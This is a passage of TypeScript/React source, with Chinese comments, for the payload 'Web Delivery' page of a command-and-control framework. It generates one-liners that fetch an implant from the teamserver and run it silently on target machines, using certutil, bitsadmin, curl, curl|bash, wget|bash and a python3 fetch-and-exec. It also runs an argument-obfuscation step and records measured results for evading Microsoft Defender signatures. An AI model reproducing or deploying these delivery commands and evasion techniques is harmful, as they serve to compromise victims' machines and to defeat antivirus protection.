      },
      // 直拉 EXE（绕过 script 层；仍走 payload 路由，UA/arch 由服务端判定）
      //
      // 三条的**输出路径都在 `post`，不在 `core`** —— 送去混淆的只剩下载段，
      // 里面一个 `%` 都没有，所以 `%USERPROFILE%` 一定原样展开（实测 15/15）。
      {
        id: 'certutil',
        label: 'certutil 直拉 EXE',
        short: 'certutil',
        core: `certutil -urlcache -split -f ${payloadUrl}`,
        post: ` ${u}`,
        tail: `&& start /b "" ${u}`,
        landing: 'cmd',
        // 与混淆无关：certutil 没有「跳过证书校验」开关，实测明文就失败
        warn: 'certutil 无法跳过证书校验，对自签证书的 teamserver 必然失败（实测 0x80072F8F）。仅当证书受信时可用。',
      },
      {
        id: 'bitsadmin',
        label: 'bitsadmin 直拉 EXE',
        short: 'bitsadmin',
        core: `bitsadmin /transfer j /download /priority foreground ${payloadUrl}`,
        post: ` ${b}`,
        tail: `& start /b "" ${b}`,
        landing: 'cmd',
        warn: 'bitsadmin 同样无法跳过证书校验（实测 0x80072F0D）。仅当证书受信时可用。',
      },
      {
        id: 'curl',
        label: 'curl.exe（Win10+ 自带）',
        short: 'curl.exe',
        // Win10+ 自带 curl.exe；-k 跳过自签。
        // ★ `-o` 写在 **URL 之后**：这样输出路径才能留在 post 段。
        //   实测两种顺序完全等价（都 rc=0 且落盘 76312B），不是想当然。
        core: `curl -k -L --http1.1 ${payloadUrl}`,
        post: ` -o ${c}`,
        tail: `&& start /b "" ${c}`,
        landing: 'cmd',
      },
    ]
  }, [scriptPs, payloadUrl])

  const linuxCmd = useMemo(
    () => `curl -skL --http1.1 '${scriptBash}' | bash`,
    [scriptBash],
  )
  const linuxWget = useMemo(
    () => `wget --no-check-certificate -qO- '${scriptBash}' | bash`,
    [scriptBash],
  )
  const linuxPython = useMemo(
    () =>
      `python3 -c "import ssl,urllib.request,os,tempfile,subprocess;ctx=ssl._create_unverified_context();u='${payloadUrl}';p=tempfile.mktemp();open(p,'wb').write(urllib.request.urlopen(u,context=ctx).read());os.chmod(p,0o755);subprocess.Popen([p]);os.unlink(p) if False else None"`,
    [payloadUrl],
  )
  const linuxCurlDirect = useMemo(
    () => `f=/tmp/.$(head -c4 /dev/urandom|xxd -p);curl -skL --http1.1 -o "$f" '${payloadUrl}'&&chmod +x "$f"&&("$f"&);sleep 3;rm -f "$f"`,
    [payloadUrl],
  )

  async function onApply() {
    if (!listener) {
      pushToast('warn', '请先选择监听器')
      return
    }
    if (!scriptRoute.startsWith('/') || !payloadRoute.startsWith('/')) {
      pushToast('warn', '路由必须以 / 开头')
      return
    }
    // 校验监听与 agent 兼容。
    // 原来是 `if (l && !profile.listeners.includes(...))` —— l 查不到时整条判断直接
    // 跳过，于是服务端残留的 "http"（不存在的监听名）可以一路写进服务端配置。
    // 这是写配置前唯一一道校验，不能留"查不到就放行"的缝。
    const l = listenerList.find((x) => x.l_name === listener)
    if (!l) {
      pushToast('warn', `监听 ${listener} 不在监听器列表里，请重新选择`)
      return
    }
    if (!profile.listeners.includes(l.l_reg_name || '')) {
      pushToast('warn', `监听 ${listener} (${l.l_reg_name}) 与 agent ${agentName} 不兼容`)
      return
    }
    setBusy(true)
    try {
      await api.webDeliveryConfig({
        script_route: scriptRoute.trim(),
        payload_route: payloadRoute.trim(),
        listener,
        agent_name: agentName,
        format,
        sleep,
        jitter: Number(jitter) || 0,
        cache_ttl_min: Number(cacheTtl) || 0,
        c2_host_url: c2Host.trim(),
        arch: arch || '',
      } as any)
      pushToast('ok', 'Web Delivery 配置已应用')
      pushLog('ok', `WebDelivery 已同步 listener=${listener} agent=${agentName} format=${format} arch=${arch || 'auto'}`)
      await loadStatus()
    } catch (e: any) {
      const msg = e?.message || String(e)
      pushToast('err', `应用失败: ${msg}`)
      pushLog('err', `WebDelivery config: ${msg}`)
      if (/404|not found|no route/i.test(msg)) setPluginMissing(true)
    } finally {
      setBusy(false)
    }
  }

  async function copy(text: string, label: string) {
    const ok = await copyText(text)
    pushToast(ok ? 'ok' : 'err', ok ? `已复制${label}` : '复制失败')
  }

  /**
   * 生成一条投递命令的混淆变体。
   *
   * 只送 `core` —— `cmd /c "…"` 外壳和后面的 `&& start /b "" …` 留在本地。原因是
   * 上游拿第一个词去查 `models/<词>.json`，而 models/ 里**没有 cmd.json**，
   * 带外壳送进去只会换回一句「command 'cmd' could not be found」。
   *
   * 变体逐条过 obfVariantIssue，**只标注、不丢弃** —— 插件对上游返回值零校验，
   * 但替操作员扔掉坏变体也不对：那样他就看不见「有风险长什么样」，
   * 每条都标出来 + 写明原因，比悄悄减员有用。
   */
  async function runAxf(e: WinEntry) {
    setAxfState((m) => ({ ...m, [e.id]: 'loading' }))
    try {
      const r = await api.argFuscatorGenerate({ command: e.core, platform: 'windows', n: axfMeta.n })
      const all = (Array.isArray(r?.variants) ? r.variants : []).filter((v) => v && v.trim())
      const issues = all.map((v) => obfVariantIssue(e.core, v))
      setAxfState((m) => ({
        ...m,
        [e.id]: {
          variants: all,
          issues,
          ms: typeof r?.ms === 'number' ? r.ms : null,
          err: '',
        },
      }))
      const bad = issues.filter(Boolean).length
      if (!all.length) pushToast('warn', `${e.short}：服务端没有返回任何变体`)
      else if (bad) pushToast('warn', `${e.short}：${all.length} 个变体里有 ${bad} 个已标注风险`)
      else pushLog('ok', `参数混淆 ${e.short}：${all.length} 个变体，逐条校验通过`)
    } catch (err: any) {
      setAxfState((m) => ({
        ...m,
        [e.id]: { variants: [], issues: [], ms: null, err: err?.message || String(err) },
      }))
      pushLog('err', `参数混淆 ${e.short}: ${err?.message || err}`)
    }
  }

  /** 组装一条命令的混淆控件属性；第一个词不在模型表里就禁用并写明原因。 */
  function axfFor(e: WinEntry) {
    const tok = firstToken(e.core)
    // cmds 为空 = 清单没拿到（老版本插件），此时不拦，交给服务端报错
    const ok = axfMeta.ready && (axfMeta.cmds.size === 0 || axfMeta.cmds.has(tok.toLowerCase()))
    return {
      landing: e.landing,
      state: axfState[e.id],
      disabled: !ok,
      disabledReason: axfMeta.ready
        ? `${tok} 不在服务端的 ${axfMeta.cmds.size} 个参数模型里，混淆一定失败`
        : axfMeta.reason,
      onRun: () => { runAxf(e).catch(() => {}) },
      onCopyVariant: (v: string, i: number) => copy(variantCommand(e, v), ` ${e.short} 变体 ${i + 1}`),
      finalText: (v: string) => variantCommand(e, v),
    }
  }

  const selectedListener = compatible.find((l) => l.l_name === listener) || listenerList.find((l) => l.l_name === listener)

  return (
    <div className="gen-page">
      <div className="gen-layout">
        <div className="gen-main card">
          <div className="card-hd">
            <h3>Web 投递 · 一键上线</h3>
            <span className="spacer" />
            <span className="dim" style={{ fontSize: 12 }}>多 Agent：Beacon / Gopher / Linux</span>
            <PageTips id="delivery">
              <p>一键上线：为每个监听器生成 curl / wget / python3 单行命令，目标机执行即回连。</p>
              <p>目标机必须能<b>直连</b>此处的 C2 地址（公网地址）。</p>
              <p>插件未加载时页面会提示；修改配置后需重新生成命令。</p>
            </PageTips>
          </div>
          <div className="card-bd gen-body">
            {pluginMissing && (
              <div className="hint warn-hint" style={{ marginBottom: 12 }}>
                服务端未加载 <b>webdelivery</b> 插件（<code>dist/extenders/webdelivery/</code>）。
                确认 profile 已启用该 service，并已编译 so 后从 dist 重启 teamserver。
              </div>
            )}

            {/* 原来这里写的是"按监听自动选 Agent：…"，那描述的是已经删掉的反推逻辑。
                真实方向是反的，照原样留着会让操作员以为点了监听能换 agent。 */}
            <div className="hint muted-hint" style={{ marginBottom: 10 }}>
              先选 <b>Agent</b>，下面的监听按兼容性过滤。一个监听可以配多种 Agent：
              GopherTCP 同时可配 gopher / Linux Agent / macOS Agent，BeaconWS 可配 beacon / Linux Agent。
            </div>

            <div className="gen-section-title">1. 投递路由</div>
            <div className="field-grid-2">
              <div className="field">
                <label>Script 路由</label>
                <input value={scriptRoute} onChange={(e) => setScriptRoute(e.target.value)} placeholder="/deliver" />
              </div>
              <div className="field">
                <label>Payload 路由</label>
                <input value={payloadRoute} onChange={(e) => setPayloadRoute(e.target.value)} placeholder="/deliver/payload" />
              </div>
            </div>
            <div className="field">
              <label>C2 Host URL（目标机访问的 teamserver，含 /api）</label>
              <input
                value={c2Host}
                onChange={(e) => setC2Host(e.target.value)}
                placeholder="https://<teamserver 地址>:<端口>/api"
              />
              <div className="dim" style={{ fontSize: 11, marginTop: 4 }}>
                one-liner 拼：<code className="mono">{scriptUrl || '…'}</code>
              </div>
            </div>

            <div className="gen-section-title">2. Agent / 监听器</div>
            <div className="field">
              <label>Agent</label>
              <div className="chip-row">
                {AGENT_PROFILES.map((p) => (
                  <button
                    key={p.agent}
                    type="button"
                    className={agentName === p.agent ? 'primary' : ''}
                    onClick={() => {
                      setAgentName(p.agent)
                      if (p.agent === 'beacon') setFormat('Exe')
                      else if (p.agent === 'gopher') setFormat('Binary EXE')
                      else setFormat(p.formats.find((f) => f.includes('ELF')) || p.formats[0])
                      setArch('')
                    }}
                  >
                    {p.label}
                  </button>
                ))}
              </div>
            </div>

            {compatible.length === 0 ? (
              <div className="hint warn-hint">
                没有兼容监听器（需要 {profile.listeners.join(' / ')}）
                <button className="ghost" style={{ marginLeft: 8 }} onClick={() => { setTab('listeners'); openUiTab('listeners') }}>
                  去创建
                </button>
              </div>
            ) : (
              <div className="gen-listener-list">
                {compatible.map((l) => (
                  <button
                    key={l.l_name}
                    type="button"
                    className={`gen-listener ${listener === l.l_name ? 'active' : ''}`}
                    onClick={() => setListener(l.l_name)}
                  >
                    <span className={`tag ${String(l.l_status).toLowerCase().includes('listen') ? 'listen' : 'offline'}`}>
                      {l.l_status || '-'}
                    </span>
                    <div className="meta">
                      <div className="name mono">{l.l_name}</div>
                      <div className="sub">{l.l_reg_name || '-'} · {l.l_bind_host || '-'}:{l.l_bind_port || '-'}</div>
                    </div>
                  </button>
                ))}
              </div>
            )}

            <div className="gen-section-title">3. 生成参数</div>
            <div className="gen-params">
              <div className="field">
                <label>格式</label>
                <div className="chip-row">
                  {formats.map((f) => (
                    <button key={f} type="button" className={format === f ? 'primary' : ''} onClick={() => setFormat(f)}>
                      {f}
                    </button>
                  ))}
                </div>
                {agentName === 'beacon' && format === 'Stager' && (
                  <div className="hint muted-hint" style={{ marginTop: 6 }}>
                    Stager：小加载器需再访问 payload 路由拉取。日常一键上线建议用 <b>Exe</b>。
                  </div>
                )}
              </div>
              <div className="field">
                <label>架构（空=按 UA 自动）</label>
                <div className="chip-row">
                  <button type="button" className={!arch ? 'primary' : ''} onClick={() => setArch('')}>自动</button>
                  {arches.map((a) => (
                    <button key={a} type="button" className={arch === a ? 'primary' : ''} onClick={() => setArch(a)}>{a}</button>
                  ))}
                </div>
              </div>
              {/* 这一段原来只对 beacon/gopher/linux 渲染，macos 和 kharon 什么都没有 ——
                  但 defaultAgentConfig 里 linux/macos/gopher 都有 reconn_timeout，
                  beacon/kharon 都有 sleep + jitter。原来那三个是随手写的集合，
                  漏掉的两个 agent 就等于在投递页设不了自己的参数。
                  现在五个 agent 都渲染，呈现什么由 sleepKind 决定（见上面的推导）。

                  标签也不写死了。linux/gopher 那栏原来写的是
                  "Reconnect timeout / count 相关" —— 它承诺两个旋钮（timeout 和 count），
                  而这一格绑的只有一个 sleep，count 根本没有对应的字段可发。 */}
              <div className="field">
                <label>{sleepSpec.kind === 'sleep' ? 'Sleep / Jitter' : '重连间隔（秒）'}</label>
                <div style={{ display: 'flex', gap: 8 }}>
                  <input
                    style={{ flex: 1 }}
                    value={sleep}
                    onChange={(e) => setSleep(e.target.value)}
                    placeholder={sleepSpec.def}
                  />
                  {sleepSpec.kind === 'sleep' && (
                    <input
                      type="number"
                      min={0}
                      max={100}
                      style={{ width: 90 }}
                      value={jitter}
                      onChange={(e) => setJitter(Number(e.target.value))}
                      title="抖动%"
                    />
                  )}
                </div>
              </div>
              <div className="field">
                <label>缓存 TTL（分钟，0=不缓存）</label>
                <input
                  type="number"
                  min={0}
                  max={1440}
                  value={cacheTtl}
                  onChange={(e) => setCacheTtl(Number(e.target.value))}
                />
              </div>
            </div>

            <div className="btns" style={{ marginTop: 12 }}>
              <button className="primary" style={{ minWidth: 140 }} disabled={busy || !listener} onClick={onApply}>
                {busy ? '同步中…' : '应用并同步'}
              </button>
              <button disabled={busy} onClick={() => loadStatus()}>刷新状态</button>
            </div>

            {/* 这里原来还追加了「· {选中监听的 reg_name}」和「· 缓存 N」两截 ——
                前者是本页表单的**当前值**（服务端那份在上面的 statusText 里已经报过），
                后者和 statusText 里的「缓存 N 条」是同一个数。一行里混两种来源、
                同一个数数两遍，读的人没法判断哪半截代表"服务端现在是什么"。
                选中监听的类型不用在这儿重复：左边的监听列表每项副标题就写着 reg_name。 */}
            <div className="hint" style={{ marginTop: 12 }}>
              {statusText}
              {loaded ? ' · 已加载' : ''}
            </div>
          </div>
        </div>

        <aside className="gen-side card">
          <div className="card-hd"><h3>投递入口</h3></div>
          <div className="card-bd" style={{ padding: 14 }}>
            <div className="gen-summary" style={{ marginBottom: 12 }}>
              <div><span className="k">Agent</span><b>{agentName}</b></div>
              <div><span className="k">格式</span><b>{format}</b></div>
              <div><span className="k">架构</span><b className="mono">{arch || 'UA 自动'}</b></div>
              <div><span className="k">监听</span><b className="mono">{listener || '未选'}</b></div>
            </div>

            <div className="hint muted-hint" style={{ marginBottom: 10 }}>
              产品级多入口：目标执行后由服务端按 <b>UA / ?d= / ?arch=</b> 返回对应 OS·架构载荷。
              beacon 仅 Windows；gopher 按 UA 出 Win/Linux/macOS；linux 仅 ELF。
            </div>

            {(agentName === 'beacon' || agentName === 'gopher') && (
              <>
                <div className="gen-section-title" style={{ marginTop: 4 }}>Windows</div>
                {winEntries.map((e) => (
                  <CmdBlock
                    key={e.id}
                    label={e.label}
                    value={entryCommand(e)}
                    onCopy={() => copy(entryCommand(e), ' ' + e.short)}
                    warn={e.warn}
                    axf={axfFor(e)}
                  />
                ))}
                {/* 收益只有这一句是有 A/B 支撑的，就按实测说。PS 那一族本轮两组都没被
                    检测出来，所以明写「未测出」—— 不写成「都能过」，那是外推。 */}
                <div className="hint muted-hint" style={{ marginTop: 10 }}>
                  <b>参数混淆</b>把命令的参数写法打乱重排：语义不变、字面不同。
                  实测同一 URL 的 <code>certutil -urlcache -split -f …</code>，明文
                  <b> 3/3 </b>被 Defender 按命令行签名拦下（<code>Trojan:Win32/Ceprolad.A</code>，
                  载荷一个字节都没下来），同命令的 5 个混淆变体 <b>5/5</b> 跑起来了；
                  curl 那条端到端下到过 <b>76312B 的 x64 载荷</b>。
                  混淆区只含下载段，输出路径留在区外 —— 实测 <code>%USERPROFILE%</code> 展开 15/15。
                  落点已从 <code>%TEMP%</code> 改为 <code>%USERPROFILE%</code>：实测
                  <code>%TEMP%</code> × <code>.exe</code> × <code>&amp;&amp; start</code> 是
                  <b>命令行</b>签名 <code>Trojan:Win32/Commando.A!ml</code> 的触发合取
                  （交错 A/B：<code>%TEMP%</code> 拦 4/4、<code>%USERPROFILE%</code> 拦 0/4）。
                  ⚠ 但<b>真实载荷</b>在 <code>%USERPROFILE%</code> 上仍被同一签名记过 3 次，
                  而良性替身复现不出来（约 30 次运行 0 检测）⇒ 换落点<b>必要但不充分</b>，别当成已修完。
                  ⚠ PowerShell 那三条本轮两组都没被检测，收益<b>未测出</b>，别当成已证。
                </div>
              </>
            )}

            {(agentName === 'linux' || agentName === 'gopher') && (
              <>
                <div className="gen-section-title" style={{ marginTop: 14 }}>Linux / macOS / Unix</div>
                <CmdBlock label="curl | bash（推荐）" value={linuxCmd}
                  onCopy={() => copy(linuxCmd, ' curl|bash')} />
                <CmdBlock label="wget | bash" value={linuxWget}
                  onCopy={() => copy(linuxWget, ' wget|bash')} />
                <CmdBlock label="curl 直拉二进制" value={linuxCurlDirect}
                  onCopy={() => copy(linuxCurlDirect, ' curl 直拉')} />
                <CmdBlock label="python3 直拉" value={linuxPython}
                  onCopy={() => copy(linuxPython, ' python3')} />
              </>
            )}

            {agentName === 'beacon' && (
              <div className="hint muted-hint" style={{ marginTop: 12 }}>
                当前 Agent=beacon → 只展示 Windows 入口。换 gopher/linux 可看 *nix 命令。
                服务端仍按 UA 出 x64/x86；可在左侧固定架构。
              </div>
            )}

            <div className="hint" style={{ marginTop: 12 }}>
              链路：one-liner → <code>/deliver</code>（脚本）→ <code>/deliver/payload</code>（按 UA 架构出包）→ 静默执行。
              直拉类跳过脚本层，直接打 payload。确保 <b>C2 Host</b> 与监听 callback 可达。
            </div>
            <button style={{ width: '100%', marginTop: 10 }} onClick={() => { setTab('listeners'); openUiTab('listeners') }}>
              管理监听器
            </button>
            <button style={{ width: '100%', marginTop: 8 }} onClick={() => { setTab('sessions'); openUiTab('sessions') }}>
              查看主机
            </button>
          </div>
        </aside>
      </div>
    </div>
  )
}
